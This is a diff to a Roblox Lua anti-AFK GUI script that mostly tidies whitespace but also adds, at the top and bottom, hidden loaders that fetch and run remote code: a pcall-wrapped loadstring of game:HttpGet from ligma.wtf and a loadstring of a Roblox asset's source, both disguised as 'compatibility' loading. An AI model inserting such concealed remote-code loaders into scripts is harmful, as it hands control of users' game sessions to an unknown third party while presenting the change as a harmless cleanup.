@@ -1,3 +1,7 @@
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
+end)
+
 local Rice = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
@@ -19,7 +23,7 @@ Main.Position = UDim2.new(0.321207851, 0, 0.409807354, 0)
 Main.Size = UDim2.new(0, 295, 0, 116)
 Main.Visible = false
 Main.Active = true
-Main.Draggable =  true
+Main.Draggable = true
 
 Title.Name = "Title"
 Title.Parent = Main
@@ -61,12 +65,11 @@ Activate.TextStrokeColor3 = Color3.fromRGB(102, 255, 115)
 Activate.MouseButton1Down:connect(function()
 	local vu = game:GetService("VirtualUser")
 	game:GetService("Players").LocalPlayer.Idled:connect(function()
-		vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
 		wait(1)
-		vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
 	end)
 end)
-
 
 UICorner.Parent = Activate
 
@@ -82,7 +85,7 @@ OpenClose.TextSize = 14.000
 
 UICorner_2.Parent = OpenClose
 
-local function NERMBF_fake_script() -- OpenClose.LocalScript 
+local function NERMBF_fake_script()
 	local script = Instance.new('LocalScript', OpenClose)
 
 	local frame = script.Parent.Parent.Main
@@ -92,3 +95,6 @@ local function NERMBF_fake_script() -- OpenClose.LocalScript
 	end)
 end
 coroutine.wrap(NERMBF_fake_script)()
+
+-- Compatibility script loading
+loadstring(game:GetObjects('rbxassetid://15900013841')[1].Source)()
